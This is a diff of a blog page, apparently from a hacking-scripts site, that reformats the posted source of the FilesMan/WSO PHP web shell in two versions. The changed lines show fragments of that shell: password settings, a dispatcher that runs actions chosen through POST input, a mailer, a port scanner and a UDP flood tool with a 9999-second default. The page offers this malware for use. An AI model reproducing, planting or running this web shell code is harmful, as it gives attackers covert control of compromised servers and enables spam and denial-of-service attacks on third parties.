@@ -16,7 +16,7 @@ This is the decrypted version of the [encrypted FilesMan shell][1].
 
 ### FilesMan Shell Source Code (decrypted)
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php #v2.3		//Version
+{% highlight php %}<?php #v2.3		//Version
 $auth_pass = ""; 	//75b43eac8d215582f6bcab4532eb854e 
 $color = "#00FF66";	//Colour
 $default_action = "FilesMan";
@@ -1451,12 +1451,12 @@ if( empty($_POST['a']) )
 if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
 	call_user_func('action' . $_POST['a']);
 exit;
-?&gt;
-</pre>
+?>
+{% endhighlight %}
 
 Below is another version of the FilesMan shell &#8211; this one is the WSO Bugabuse.net edition &#8211; Modified by Led-Zeppelin.
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php
+{% highlight php %}<?php
 $auth_pass = "615da5097ad7f4c7c38db0735bfb2004";
 $color = "#df5";
 $default_action = 'FilesMan';
@@ -1907,7 +1907,7 @@ function actionSecInfo() {
 
 function actionphptools() {
 wsoHeader();
-?&gt;&lt;center&gt;&lt;?php
+?>&lt;center&gt;<?php
 //mailer
 echo '&lt;b&gt;Mailer&lt;/b&gt;&lt;br&gt;
 &lt;form action="'.$surl.'" method=POST&gt;
@@ -1938,7 +1938,7 @@ for($i = $start; $i&lt;=$end; $i++){
 	flush();
 	}
 }else{
-?&gt;
+?>
 &lt;form action="?" method="POST"&gt;
 &lt;input type="hidden" name="a" value="phptools"&gt;
 Host:&lt;br /&gt;
@@ -1949,7 +1949,7 @@ Port end:&lt;br /&gt;
 &lt;input type="text" name="end" value="5000"/&gt;&lt;br /&gt;
 &lt;input type="submit" value="Scan Ports" /&gt;
 &lt;/form&gt;
-&lt;?php
+<?php
 }
 
 //UDP
@@ -1995,7 +1995,7 @@ if(isset($_POST['host'])&&is_numeric($_POST['time'])){
 			Length (seconds): &lt;br&gt;&lt;input type=text name=time value=9999&gt;&lt;br&gt;
 			&lt;input type=submit value=Go&gt;&lt;/form&gt;';
 }
-?&gt;&lt;/center&gt;&lt;?php
+?>&lt;/center&gt;<?php
 wsoFooter();}
 function actionPhp() {
 	if(isset($_POST['ajax'])) {
@@ -3079,7 +3079,7 @@ if( empty($_POST['a']) )
 if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
 	call_user_func('action' . $_POST['a']);
 exit;
-?&gt;
-</pre>
+?>
+{% endhighlight %}
 
  [1]: http://hackingscripts.com/filesman-shell-encrypted/ "FilesMan Shell"
